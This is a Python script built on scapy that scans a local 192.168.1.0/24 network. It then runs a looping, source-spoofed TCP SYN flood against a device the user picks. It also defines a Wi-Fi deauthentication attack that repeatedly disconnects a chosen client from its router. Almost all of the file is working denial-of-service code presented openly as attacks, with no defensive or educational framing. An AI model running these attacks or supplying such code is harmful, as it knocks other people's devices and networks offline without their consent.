import os
import scapy.all as scapy
import socket
import random


def scannetwork(pinginactive=False):
    print("Scanning...")
    if pinginactive:
        pingdevices()
    else:
        pass
    iprange = "192.168.1.1/24"

    arp = scapy.ARP(pdst=iprange)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    packet = ether/arp

    sendingresult = scapy.srp(packet, timeout=10, verbose=0)[0]

    listofips = []
    listofmacs = []
    listofdevicenames = []

    for elemnt in sendingresult:

        ip = elemnt[1].psrc
        listofips.append(ip)
        mac = elemnt[1].hwsrc
        listofmacs.append(mac)
        try:
            devicename = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            devicename = "Unknown"
        listofdevicenames.append(devicename)
        print(
            f"IP: {ip}, MAC: {mac}, Device Name: {devicename}")
    print("Scan complete.")
    return listofips, listofmacs, listofdevicenames


def pingdevices():
    print("Waking up all devices...")
    baseip = "192.168.1."
    for i in range(1, 255):
        ip = f"{baseip}{i}"

        os.system(f"ping -c 2 -w 1000 {ip} >nul")


def ddosattack(targetip, targetport):
    randomnumber = random.randint(3, 254)
    print(f"Starting DDoS attack on {targetip}:{targetport}")
    ip = scapy.IP(src=f"192.168.1.{randomnumber}/24", dst=targetip)
    tcp = scapy.TCP(sport=random.randint(1024, 65535),
                    dport=targetport, flags="S")

    raw = r'"X" * 1024'
    packet = ip/tcp/raw
    print("DDoS attack initiated. Press Ctrl+C to stop.")
    scapy.send(packet, verbose=0, loop=1)


def DeAAttack(macaddress, routermacaddress):
    print(
        f"Starting Deauthentication attack on {macaddress} via {routermacaddress}")
    packet = scapy.RadioTap() / scapy.Dot11(addr1=macaddress, addr2=routermacaddress,
                                            addr3=routermacaddress) / scapy.Dot11Deauth(reason=7)
    print("Deauthentication attack initiated. Press Ctrl+C to stop.")
    scapy.sendp(packet, count=100, inter=0.1, verbose=1, loop=1)


if __name__ == "__main__":
    scannetwork(True)
    try:
        devicenumber = input("device id: ")
        ddosattack(targetip=f"192.168.1.{devicenumber}", targetport=80)
    except KeyboardInterrupt:
        print("Operation stopped by user.")
